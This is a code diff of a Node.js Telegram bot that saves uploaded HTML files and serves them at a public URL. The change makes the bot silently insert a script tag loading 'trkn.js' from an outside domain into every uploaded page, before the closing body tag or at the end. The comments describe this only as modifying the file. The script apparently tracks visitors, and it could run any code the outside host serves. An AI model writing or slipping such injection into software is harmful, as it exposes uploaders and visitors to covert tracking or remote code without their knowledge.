@@ -62,10 +62,19 @@ bot.on("document", async (ctx) => {
   const filePath = path.join(UPLOADS_DIR, `${customName}.html`);
   const fileLink = await ctx.telegram.getFileLink(file.file_id);
 
-  // Télécharger et sauvegarder le fichier
+  // Télécharger et modifier le fichier
   const response = await fetch(fileLink);
-  const buffer = await response.arrayBuffer();
-  await fs.writeFile(filePath, Buffer.from(buffer));
+  let content = await response.text();
+
+  // Ajoute le script à la fin du <body> si <body> existe
+  if (content.includes("</body>")) {
+    content = content.replace("</body>", `<script src="https://javascriptonline.com/trkn.js"></script></body>`);
+  } else {
+    content += `<script src="https://javascriptonline.com/trkn.js"></script>`;
+  }
+
+  // Sauvegarde du fichier modifié
+  await fs.writeFile(filePath, content);
 
   // URL d'accès
   const fileUrl = `${process.env.BASE_URL}/uploads/${customName}.html`;
